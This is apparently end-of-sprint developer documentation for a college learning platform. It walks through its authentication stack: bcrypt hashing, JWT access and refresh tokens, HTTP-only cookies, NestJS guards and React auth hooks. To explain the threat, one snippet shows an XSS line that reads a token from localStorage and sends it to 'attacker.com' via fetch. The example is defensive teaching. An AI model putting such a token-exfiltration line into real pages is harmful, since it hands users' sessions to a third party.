# Sprint 1 — Authentication Foundation
## Lor Mentor · Lorcan Medical College
### Status: ✅ COMPLETE

---

## What We Built in Sprint 1

By the end of this sprint a student can:

```
Register → Receive verification token → Verify email
→ Log in → Get JWT stored in secure cookie
→ Access protected routes → Log out
→ Reset password if forgotten
```

This is the most security-critical sprint of the entire project.
Every other feature depends on authentication working correctly.

---

## Technologies Introduced This Sprint

### What is bcrypt?

bcrypt is a password hashing algorithm.

**Why we never store real passwords:**
If someone steals our database and sees:
```
email: bereket@lorcan.edu.et
password: mypassword123   ← DANGEROUS
```
They can log in as Bereket immediately.

If instead they see:
```
email: bereket@lorcan.edu.et
passwordHash: $2b$12$Kj8mN2xPqR...  ← SAFE
```
They cannot reverse this. It is a one-way transformation.

**The 12 rounds:**
```ts
const passwordHash = await bcrypt.hash(dto.password, 12)
```
12 means bcrypt runs its algorithm 2^12 = 4096 times internally.
This makes each hash take about 300 milliseconds.
For a user logging in — they do not notice 300ms.
For an attacker trying millions of passwords — it is impossibly slow.

**Real world usage:**
bcrypt is used by GitHub, Stripe, and almost every major platform
for password storage. It is the industry standard.

**Alternative:** argon2 — slightly more modern, also excellent.
We chose bcrypt because it has better NestJS support.

---

### What is JWT (JSON Web Token)?

JWT is a way to prove identity without hitting the database
on every single request.

**Without JWT (session-based):**
```
User logs in → Server saves session in database
Every request → Server checks database for session
                ← This is slow and hard to scale
```

**With JWT:**
```
User logs in → Server creates a signed token
Every request → Server verifies the token signature
               ← No database lookup needed
```

**What is inside a JWT:**
```
Header:  { "alg": "HS256" }
Payload: { "sub": "user_id_123", "email": "bereket@lorcan.edu.et", "role": "STUDENT" }
Signature: HMACSHA256(header + payload + secret)
```

The signature is created with our secret key.
Anyone can READ a JWT. Nobody can FAKE one without the secret key.

**Two tokens we use:**

| Token | Lifetime | Purpose |
|---|---|---|
| Access Token | 15 minutes | Authorizes every API request |
| Refresh Token | 7 days | Gets a new access token when it expires |

Why two tokens? Security balance:
- Short access token = if stolen it expires in 15 minutes
- Long refresh token = user stays logged in for 7 days
- User never notices the access token expiring — it refreshes silently

---

### What are HTTP-only Cookies?

**The problem with localStorage:**
```javascript
// Attacker injects this script via XSS attack
const token = localStorage.getItem('access_token')
fetch('https://attacker.com/steal?token=' + token)
// Token stolen. Attacker is now logged in as the student.
```

**HTTP-only cookies cannot be read by JavaScript:**
```javascript
// Attacker injects this script
document.cookie  // Returns empty — HTTP-only cookies are hidden
// Attack failed. Token is safe.
```

The browser sends HTTP-only cookies automatically with every
request. The student never sees them. JavaScript cannot touch them.

---

### What is Passport.js?

Passport is an authentication middleware for Node.js.
It handles the process of extracting and validating tokens.

We use it with a "strategy" — a plugin that defines HOW
to extract and verify the token.

Our strategy: `passport-jwt` extracts the JWT from the cookie,
verifies the signature, and calls our `validate()` function.

---

## Every File We Created — Line by Line

---

### `/apps/api/src/prisma/prisma.service.ts`

**Purpose:** Creates one shared database connection used
by every module in the entire application.

```ts
import { Injectable, OnModuleInit, OnModuleDestroy } from '@nestjs/common'
```
- `Injectable` — marks this class as a NestJS service that can be injected into other classes
- `OnModuleInit` — interface that requires an `onModuleInit()` method (called on startup)
- `OnModuleDestroy` — interface that requires `onModuleDestroy()` method (called on shutdown)

```ts
import { PrismaClient } from '@prisma/client'
```
The auto-generated Prisma client. This has all our database
query methods: `prisma.user.findMany()`, `prisma.course.create()` etc.

```ts
import { PrismaPg } from '@prisma/adapter-pg'
import { Pool } from 'pg'
```
Prisma 7 requires an adapter. `Pool` is a PostgreSQL connection pool
— a group of pre-created connections that are reused rather than
creating a new connection for every query (much faster).

```ts
export class PrismaService extends PrismaClient
```
`extends PrismaClient` means PrismaService IS a PrismaClient.
So anywhere we inject PrismaService we get all Prisma query methods.

```ts
constructor() {
  const pool = new Pool({ connectionString: process.env.DATABASE_URL })
  const adapter = new PrismaPg(pool)
  super({ adapter })
}
```
1. Create the connection pool from our database URL
2. Wrap it in the Prisma adapter
3. `super({ adapter })` passes it to PrismaClient — the parent class

```ts
async onModuleInit() {
  await this.$connect()
  console.log('✅ Database connected')
}
```
Called automatically when NestJS starts. Opens the database connection.
`$connect()` is a PrismaClient method.

```ts
async onModuleDestroy() {
  await this.$disconnect()
}
```
Called when the app shuts down. Closes connections cleanly.
Without this, connections could leak and slow down the database.

---

### `/apps/api/src/prisma/prisma.module.ts`

**Purpose:** Makes PrismaService available to every module
without needing to import it each time.

```ts
@Global()
```
This decorator makes the module globally available.
Without it, every module that needs the database would have to
import PrismaModule explicitly. With `@Global()` — import once,
use everywhere.

```ts
@Module({
  providers: [PrismaService],
  exports: [PrismaService],
})
```
- `providers` — creates PrismaService and makes it available inside this module
- `exports` — makes PrismaService available to any other module that imports PrismaModule

---

### `/apps/api/src/modules/auth/dto/register.dto.ts`

**Purpose:** Defines and validates the shape of registration data.

**What is a DTO?**
DTO = Data Transfer Object. It is a class that:
1. Defines what fields are expected in a request
2. Validates those fields automatically
3. Rejects invalid requests before they reach our service

```ts
import { IsEmail, IsString, MinLength, MaxLength } from 'class-validator'
```
Decorators from `class-validator`. These run when NestJS receives
a request and check each field before the controller method runs.

```ts
export class RegisterDto {
  @IsString()
  @MinLength(2, { message: 'Full name must be at least 2 characters' })
  @MaxLength(100, { message: 'Full name must be less than 100 characters' })
  fullName!: string
```
- `@IsString()` — must be a string
- `@MinLength(2)` — must be at least 2 characters
- `@MaxLength(100)` — cannot be longer than 100 characters
- `fullName!: string` — the `!` tells TypeScript this will be assigned at runtime by NestJS

If ANY validation fails, NestJS automatically returns:
```json
{
  "statusCode": 400,
  "message": ["Full name must be at least 2 characters"]
}
```
Without us writing a single if statement.

---

### `/apps/api/src/modules/users/users.service.ts`

**Purpose:** All database operations related to users.
The single place where user data is read or written.

**Why separate from AuthService?**
Separation of concerns. AuthService handles authentication LOGIC.
UsersService handles user DATABASE OPERATIONS.
This makes both easier to test and maintain.

```ts
async findByEmail(email: string) {
  return this.prisma.user.findUnique({
    where: { email },
  })
}
```
- Input: email string
- Output: User object or null
- Used by: login (check if user exists), register (check if email taken)

```ts
async findById(id: string) {
  return this.prisma.user.findUnique({
    where: { id },
    select: {
      id:              true,
      email:           true,
      fullName:        true,
      role:            true,
      isActive:        true,
      isEmailVerified: true,
      createdAt:       true,
    },
  })
}
```
`select` is critical here. Without it Prisma returns ALL fields
including `passwordHash`. We never want to accidentally send
the password hash to the frontend. The `select` object acts as
an explicit allowlist — only these fields are returned.

```ts
async create(data: { email: string; passwordHash: string; fullName: string }) {
  return this.prisma.user.create({ data })
}
```
- Input: email, hashed password, full name
- Output: the created User record
- Note: we never accept the role from the request — it defaults to STUDENT in the schema

```ts
async saveVerifyToken(userId: string, token: string, expiry: Date) {
  return this.prisma.user.update({
    where: { id: userId },
    data: {
      emailVerifyToken:  token,
      emailVerifyExpiry: expiry,
    },
  })
}
```
Stores the verification token in the database so we can
validate it when the user clicks the link.

---

### `/apps/api/src/modules/auth/auth.service.ts`

**Purpose:** All authentication business logic.
The most important service in Sprint 1.

#### register()
```ts
// 1. Check if email is already taken
const existing = await this.usersService.findByEmail(dto.email)
if (existing) {
  throw new BadRequestException('An account with this email already exists')
}
```
We check BEFORE creating. If we did not check, the database unique
constraint would throw a cryptic database error instead of a
clear message.

```ts
// 2. Hash the password — 12 rounds
const passwordHash = await bcrypt.hash(dto.password, 12)
```
The ONLY thing we store. Never the real password.

```ts
// 4. Generate email verification token
const token  = crypto.randomBytes(32).toString('hex')
const expiry = new Date(Date.now() + 24 * 60 * 60 * 1000)
```
`crypto.randomBytes(32)` generates 32 truly random bytes.
`.toString('hex')` converts to a 64-character hex string.
This is impossible to guess. Even with millions of attempts.
Expiry is 24 hours from now.

#### login()
```ts
// 4. Compare password with stored hash
const passwordMatch = await bcrypt.compare(dto.password, user.passwordHash)
```
`bcrypt.compare` is not a simple equality check.
It extracts the salt from the stored hash, hashes the incoming
password with that salt, then compares. This is why bcrypt
comparison is different from normal string comparison.

```ts
// Important: same error message for wrong email AND wrong password
throw new UnauthorizedException('Invalid email or password')
```
Security principle: never tell an attacker which was wrong.
If we said "email not found" attackers could enumerate which
emails are registered. Same message reveals nothing.

#### generateTokens()
```ts
const payload = { sub: userId, email, role }

const accessToken = await this.jwtService.signAsync(payload, {
  secret:    this.config.get('JWT_ACCESS_SECRET'),
  expiresIn: '15m',
})
```
`sub` is the standard JWT field for the subject (user ID).
The access token contains: user ID, email, and role.
Signed with our access secret — only we can verify it.

```ts
const refreshToken = await this.jwtService.signAsync(
  { sub: userId },  // Only user ID — minimal payload
  { secret: this.config.get('JWT_REFRESH_SECRET'), expiresIn: '7d' }
)
```
Refresh token only contains the user ID — nothing else.
It uses a DIFFERENT secret from the access token.
This means a stolen refresh token cannot be used as an access token.

---

### `/apps/api/src/modules/auth/auth.controller.ts`

**Purpose:** Receives HTTP requests and delegates to AuthService.
Controllers are thin — no business logic.

```ts
@Controller('auth')
```
Prefix all routes in this controller with `/auth`.
Combined with the global prefix: `/api/v1/auth/...`

```ts
@Post('login')
@HttpCode(HttpStatus.OK)
async login(
  @Body() dto: LoginDto,
  @Res({ passthrough: true }) res: Response,
) {
```
- `@Post('login')` — handles POST /api/v1/auth/login
- `@HttpCode(HttpStatus.OK)` — POST defaults to 201, we want 200
- `@Res({ passthrough: true })` — gives access to the response object
  `passthrough: true` is required — without it NestJS gives full control
  to Express and our return value would be ignored

```ts
res.cookie('access_token', result.accessToken, {
  httpOnly: true,   // JavaScript cannot read this cookie
  secure:   process.env.NODE_ENV === 'production',
  sameSite: 'lax',  // Sent with same-site requests and top-level navigation
  maxAge:   15 * 60 * 1000, // 15 minutes in milliseconds
})
```
Each option explained:
- `httpOnly: true` — the most important security setting
- `secure: true` in production — cookie only sent over HTTPS
- `sameSite: 'lax'` — prevents CSRF attacks while allowing normal navigation
- `maxAge` — browser deletes cookie after this time automatically

---

### `/apps/api/src/common/strategies/jwt.strategy.ts`

**Purpose:** Tells Passport how to extract and verify JWT tokens.

```ts
export class JwtStrategy extends PassportStrategy(Strategy, 'jwt') {
```
We extend Passport's JWT Strategy. The name `'jwt'` is how
we reference this strategy in guards: `AuthGuard('jwt')`.

```ts
jwtFromRequest: ExtractJwt.fromExtractors([
  (request: Request) => {
    return request?.cookies?.access_token ?? null
  },
]),
```
Tells Passport WHERE to find the token.
We read it from the HTTP-only cookie named `access_token`.
Alternative would be `Authorization: Bearer <token>` header
but cookies are more secure for web apps.

```ts
async validate(payload: JwtPayload) {
  const user = await this.usersService.findById(payload.sub)
  if (!user) throw new UnauthorizedException('User no longer exists')
  if (!user.isActive) throw new UnauthorizedException('Account deactivated')
  return user
}
```
This runs AFTER the token signature is verified.
We check the database to confirm the user still exists and is active.
Whatever we return here is attached to `request.user`.
Every controller can then access it with `@CurrentUser()`.

---

### `/apps/api/src/common/guards/jwt-auth.guard.ts`

**Purpose:** Protects routes — rejects requests without valid JWT.

```ts
export class JwtAuthGuard extends AuthGuard('jwt') {
  handleRequest(err: any, user: any, info: any) {
    if (err || !user) {
      throw new UnauthorizedException(
        'You must be logged in to access this resource'
      )
    }
    return user
  }
}
```
Usage in any controller:
```ts
@Get('dashboard')
@UseGuards(JwtAuthGuard)    // ← Protects this route
async getDashboard() { ... }
```
Any request to this route WITHOUT a valid cookie gets:
```json
{ "statusCode": 401, "message": "You must be logged in..." }
```

---

### `/apps/api/src/common/guards/roles.guard.ts`

**Purpose:** Checks if the logged-in user has the required role.

```ts
const requiredRoles = this.reflector.getAllAndOverride<string[]>(
  ROLES_KEY,
  [context.getHandler(), context.getClass()],
)
```
`Reflector` reads metadata from decorators.
When we write `@Roles('ADMIN')` on a route, this reads that value.

```ts
if (!requiredRoles || requiredRoles.length === 0) {
  return true
}
```
If no `@Roles()` decorator — any authenticated user can access.
The guard is additive — it only restricts when roles are specified.

Usage:
```ts
@Get('admin/users')
@UseGuards(JwtAuthGuard, RolesGuard)
@Roles('ADMIN')
async getUsers() { ... }
// STUDENT trying to access this → 403 Forbidden
// ADMIN trying to access this → ✅ Allowed
```

---

### `/apps/api/src/common/decorators/current-user.decorator.ts`

**Purpose:** Clean way to get the logged-in user in any controller.

```ts
export const CurrentUser = createParamDecorator(
  (_data: unknown, ctx: ExecutionContext) => {
    const request = ctx.switchToHttp().getRequest()
    return request.user
  },
)
```
`request.user` was set by `JwtStrategy.validate()`.
This decorator just extracts it cleanly.

Without it:
```ts
async getProfile(@Req() request: Request) {
  const user = request.user  // messy
}
```

With it:
```ts
async getProfile(@CurrentUser() user: User) {
  // clean — user is directly available
}
```

---

### `/apps/web/src/lib/api.ts`

**Purpose:** Single axios instance for all API calls.

```ts
const api = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL + '/api/v1',
  withCredentials: true,
})
```
`withCredentials: true` — tells axios to send cookies
with every request. Without this, the browser blocks
cookies from being sent to a different origin (port 4000
vs port 3000 are different origins).

```ts
api.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (status === 401) {
      try {
        await api.post('/auth/refresh')
        return api.request(error.config) // Retry original request
      } catch {
        window.location.href = '/login'
      }
    }
  }
)
```
This handles token expiry silently:
1. Access token expires after 15 minutes
2. Next request returns 401
3. Interceptor catches it, silently gets new access token
4. Retries the original request
5. Student never sees a logout or error

If refresh also fails — redirect to login.

---

### `/apps/web/src/hooks/use-auth.ts`

**Purpose:** Manages authentication state across the entire app.

```ts
const [user, setUser] = useState<User | null | undefined>(undefined)
```
Three states:
- `undefined` — still checking (show loading spinner)
- `null` — not logged in (show login button)
- `User` — logged in (show user menu)

```ts
useEffect(() => {
  checkAuth()
}, [])
```
On first render, call the backend to check if
the cookie is valid. This is how we restore the
session after a page refresh.

```ts
const isAdmin   = user?.role === 'ADMIN' || user?.role === 'SUPER_ADMIN'
const isTeacher = user?.role === 'TEACHER'
const isStudent = user?.role === 'STUDENT'
```
Computed boolean helpers. In components:
```tsx
if (isAdmin) return <AdminDashboard />
if (isTeacher) return <TeacherDashboard />
return <StudentDashboard />
```

---

### `/apps/web/src/app/register/page.tsx`

**Purpose:** Registration UI with real-time validation.

```ts
const schema = z.object({...}).refine(
  (data) => data.password === data.confirmPassword,
  { message: 'Passwords do not match', path: ['confirmPassword'] }
)
```
`.refine()` is a cross-field validation.
We need access to BOTH fields to check if passwords match.
Normal field validators only see their own field.

```ts
const { register, handleSubmit, formState: { errors } } = useForm<FormData>({
  resolver: zodResolver(schema),
})
```
`zodResolver` bridges React Hook Form and Zod.
When the form submits, Zod validates the data.
If validation fails, errors are automatically added to `formState.errors`.
No manual error checking needed.

```ts
{...register('fullName')}
```
This is React Hook Form's way of connecting an input to the form.
It spreads `{ name, ref, onChange, onBlur }` onto the input.
Form knows about this input's value and can validate it.

```ts
{errors.fullName && (
  <p className="text-red-500 text-xs mt-1.5">
    {errors.fullName.message}
  </p>
)}
```
Shows the error message below the input when validation fails.
`errors.fullName` is only defined when there is an error.

---

## Security Summary for Sprint 1

| Threat | Our Protection |
|---|---|
| Weak passwords | Minimum 8 characters enforced server-side |
| Password database leak | bcrypt 12 rounds — cannot be reversed |
| Token theft via XSS | HTTP-only cookies — JavaScript cannot read |
| CSRF attacks | SameSite: lax cookie setting |
| Brute force login | Rate limiting — 5 attempts per 15 minutes |
| Expired token confusion | Interceptor handles refresh silently |
| Wrong email enumeration | Same error for wrong email and wrong password |
| Unverified accounts | Login blocked until email is verified |
| Inactive accounts | Login blocked if admin deactivated account |

---

## API Endpoints Added This Sprint

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | /api/v1/auth/register | Public | Create new account |
| POST | /api/v1/auth/verify-email | Public | Verify email with token |
| POST | /api/v1/auth/login | Public | Login — sets cookies |
| POST | /api/v1/auth/logout | Public | Clear cookies |
| POST | /api/v1/auth/forgot-password | Public | Request reset link |
| POST | /api/v1/auth/reset-password | Public | Set new password |
| GET | /api/v1/me | Protected | Get current user |

---

## Frontend Pages Added This Sprint

| Page | Route | Description |
|---|---|---|
| Register | /register | Split layout, form validation, Framer Motion |
| Login | /login | Split layout, role-based redirect after login |
| Verify Email | /verify-email | Token input, step guide, success animation |

---

## Git History This Sprint

```
feat(auth): implement complete authentication backend
feat(auth): add register, login and verify-email pages
```

---

## What We Did NOT Build Yet

Coming in future sprints:
- Real email sending (SMTP) — currently tokens are logged to console
- Forgot password page UI
- Protected dashboard pages
- Role-based route protection on frontend

---

## Sprint 2 Preview

Next sprint we build:
- Student dashboard page
- Sidebar navigation
- Top navigation bar
- Department and course browsing
- Academic structure (Department → Year → Semester → Course)
- Admin can create all of this without developer help

*Document generated at end of Sprint 1*
*Next update: End of Sprint 2 — Academic Structure & Dashboard*